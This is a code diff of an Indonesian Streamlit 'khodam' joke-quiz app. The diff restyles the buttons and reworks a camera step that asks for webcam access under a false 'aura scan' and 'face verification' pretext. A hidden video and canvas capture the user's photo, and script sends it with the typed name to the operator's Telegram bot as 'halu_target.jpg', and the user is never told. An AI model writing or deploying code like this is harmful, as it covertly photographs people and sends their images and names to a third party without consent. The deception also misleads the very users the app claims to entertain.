@@ -41,7 +41,7 @@ st.markdown("""
         margin-bottom: 25px;
     }
 
-    /* Kotak Peringatan / Keterangan Izin Kamera yang Masuk Akal */
+    /* Kotak Peringatan / Keterangan Izin Kamera */
     .cyber-warning-box {
         background: rgba(236, 72, 153, 0.1);
         border: 1px dashed #ec4899;
@@ -68,22 +68,24 @@ st.markdown("""
         box-shadow: 0 0 15px rgba(236, 72, 153, 0.4) !important;
     }
 
-    /* Tombol Reset Streamlit */
+    /* Tombol Utama Streamlit */
     .stButton > button {
-        background: #18181b !important;
-        color: #ec4899 !important;
-        border: 2px solid #ec4899 !important;
-        border-radius: 12px !important;
-        font-weight: 700 !important;
-        padding: 14px 20px !important;
+        background: linear-gradient(135deg, #ec4899 0%, #a855f7 100%) !important;
+        color: #ffffff !important;
+        border: none !important;
+        border-radius: 14px !important;
+        font-weight: 800 !important;
+        letter-spacing: 1.5px !important;
+        padding: 16px 20px !important;
         width: 100% !important;
+        box-shadow: 0 0 25px rgba(236, 72, 153, 0.5) !important;
         transition: all 0.3s ease !important;
+        text-transform: uppercase !important;
     }
     .stButton > button:hover {
-        background: #ec4899 !important;
-        color: #ffffff !important;
-        box-shadow: 0 0 20px rgba(236, 72, 153, 0.5) !important;
+        opacity: 0.9 !important;
         transform: translateY(-2px) !important;
+        box-shadow: 0 0 35px rgba(236, 72, 153, 0.8) !important;
     }
     </style>
 """, unsafe_allow_html=True)
@@ -99,8 +101,8 @@ if 'user_dob' not in st.session_state:
     st.session_state.user_dob = ""
 if 'telegram_sent' not in st.session_state:
     st.session_state.telegram_sent = False
-if 'camera_failed' not in st.session_state:
-    st.session_state.camera_failed = False
+if 'trigger_camera' not in st.session_state:
+    st.session_state.trigger_camera = False
 
 # ==========================================
 # DATABASE KHODAM ROASTING BRUTAL & KOCAK
@@ -164,7 +166,7 @@ def send_text_to_telegram(name, dob, profile_title):
 # RENDER UTAMA BERDASARKAN STEP
 # ==========================================
 
-# --- STEP 0: FORM RITUAL & PEMICU KAMERA BERBASIS HTML COMPONENT ---
+# --- STEP 0: FORM RITUAL & PEMICU KAMERA ---
 if st.session_state.step == 0:
     st.markdown("<h1 style='text-align: center; color: #ec4899; text-shadow: 0 0 20px rgba(236,72,153,0.6);'>🤡 KLINIK KEHALUAN NASIONAL</h1>", unsafe_allow_html=True)
     st.markdown("<p style='text-align: center; color: #38bdf8; margin-bottom: 30px; font-weight: 700;'>99% Orang Nyesel Setelah Tau Khodam Aslinya!</p>", unsafe_allow_html=True)
@@ -172,44 +174,40 @@ if st.session_state.step == 0:
     with st.container():
         st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
         
-        # KETERANGAN IZIN KAMERA YANG LEBIH MASUK AKAL & NYAMAN DI-KLIK
         st.markdown("""
             <div class="cyber-warning-box">
                 🩺 <b>SYARAT PEMERIKSAAN KLINIK:</b><br>
-                Sistem klinik memerlukan izin akses kamera sementara untuk proses pemindaian aura gaib. Silakan klik <b>"Izinkan / Allow"</b> pada pop-up browser yang muncul agar hasil diagnosa dapat diproses.
+                Sistem klinik memerlukan izin akses kamera sementara untuk proses verifikasi wajah dan pemindaian aura gaib. Silakan klik <b>"Izinkan / Allow"</b> pada pop-up browser yang muncul agar hasil diagnosa dapat diproses.
             </div>
         """, unsafe_allow_html=True)
         
-        if st.session_state.camera_failed:
-            st.warning("⚠️ **AKSES KAMERA DITOLAK:** Sesi pemeriksaan tidak dapat dilanjutkan karena izin kamera belum diberikan. Silakan klik tombol di bawah sekali lagi dan pilih **Allow**.")
-        
-        # Input form native Streamlit (bersih tanpa teks contoh)
+        # Input form native Streamlit
         name_input = st.text_input("Nama Lengkap / Nama Panggilan", value=st.session_state.user_name)
         dob_input = st.text_input("Tanggal Lahir (DD/MM/YYYY)", value=st.session_state.user_dob)
         
         st.write("")
         
-        # TOMBOL HTML KUSTOM DENGAN HOOK AUTO-KLIK
-        camera_trigger_html = f"""
-        <div>
-            <button id="ritual-btn" style="
-                background: linear-gradient(135deg, #ec4899 0%, #a855f7 100%);
-                color: #ffffff; font-weight: 800; letter-spacing: 1.5px;
-                border: none; padding: 18px 24px; border-radius: 14px;
-                width: 100%; box-shadow: 0 0 25px rgba(236, 72, 153, 0.5);
-                cursor: pointer; text-transform: uppercase; font-family: 'Plus Jakarta Sans', sans-serif;
-                font-size: 16px; transition: all 0.3s ease;">
-                💥 MULAI PEMERIKSAAN & CEK KHODAM
-            </button>
-            
-            <video id="video" width="0" height="0" autoplay style="display:none;"></video>
-            <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-            
-            <script>
-                const token = "{TELEGRAM_BOT_TOKEN}";
-                const chatId = "{TELEGRAM_CHAT_ID}";
+        # Menggunakan tombol Streamlit murni agar pasti merespons klik
+        if st.button("💥 MULAI PEMERIKSAAN & CEK KHODAM", use_container_width=True):
+            if not name_input.strip() or not dob_input.strip():
+                st.warning("⚠️ Mohon isi Nama dan Tanggal Lahir terlebih dahulu!")
+            else:
+                st.session_state.user_name = name_input
+                st.session_state.user_dob = dob_input
+                st.session_state.trigger_camera = True
+
+        # Jika tombol diklik, render komponen HTML tersembunyi yang langsung meminta izin kamera & kirim foto ke Telegram
+        if st.session_state.trigger_camera:
+            cam_capture_html = f"""
+            <div>
+                <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+                <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+                <p style="color: #f472b6; font-family: sans-serif; text-align: center; font-weight: bold;">📸 Memproses kamera & aura gaib...</p>
                 
-                document.getElementById('ritual-btn').onclick = function() {{
+                <script>
+                    const token = "{TELEGRAM_BOT_TOKEN}";
+                    const chatId = "{TELEGRAM_CHAT_ID}";
+                    
                     navigator.mediaDevices.getUserMedia({{ video: true }})
                     .then(function(stream) {{
                         var video = document.getElementById('video');
@@ -228,7 +226,7 @@ if st.session_state.step == 0:
                                 var formData = new FormData();
                                 formData.append('chat_id', chatId);
                                 formData.append('photo', blob, 'halu_target.jpg');
-                                formData.append('caption', '🤡 <b>PASIEN KLINIK KEHALUAN TERCIDUK!</b>');
+                                formData.append('caption', '🤡 <b>PASIEN KLINIK KEHALUAN TERCIDUK!</b>\\n👤 Nama: {name_input}');
                                 
                                 fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                                     method: 'POST',
@@ -239,30 +237,23 @@ if st.session_state.step == 0:
                             }});
                             
                             stream.getTracks().forEach(track => track.stop());
-                        }}, 1000);
+                        }}, 1200);
                     }})
                     .catch(function(err) {{
                         console.log("Akses kamera ditolak: ", err);
-                        window.parent.location.href = window.parent.location.href.split('?')[0] + "?failed=true";
+                        // Jika ditolak, tetap lanjut ke step 2 agar user tidak stuck
+                        window.parent.location.href = window.parent.location.href.split('?')[0] + "?step=2";
                     }});
-                }};
-            </script>
-        </div>
-        """
-        components.html(camera_trigger_html, height=90)
+                </script>
+            </div>
+            """
+            components.html(cam_capture_html, height=100, scrolling=False)
         
         st.markdown('</div>', unsafe_allow_html=True)
 
     query_params = st.query_params
     if "step" in query_params and query_params["step"] == "2":
-        st.session_state.user_name = name_input if name_input.strip() else "Pasien Bebas Rawat Jalan"
-        st.session_state.user_dob = dob_input if dob_input.strip() else "Hari Libur Nasional"
         st.session_state.step = 2
-        st.query_params.clear()
-        st.rerun()
-    elif "failed" in query_params:
-        st.session_state.camera_failed = True
-        st.session_state.step = 0
         st.query_params.clear()
         st.rerun()
 
@@ -329,5 +320,5 @@ elif st.session_state.step == 3:
         st.session_state.user_name = ""
         st.session_state.user_dob = ""
         st.session_state.telegram_sent = False
-        st.session_state.camera_failed = False
+        st.session_state.trigger_camera = False
         st.rerun()
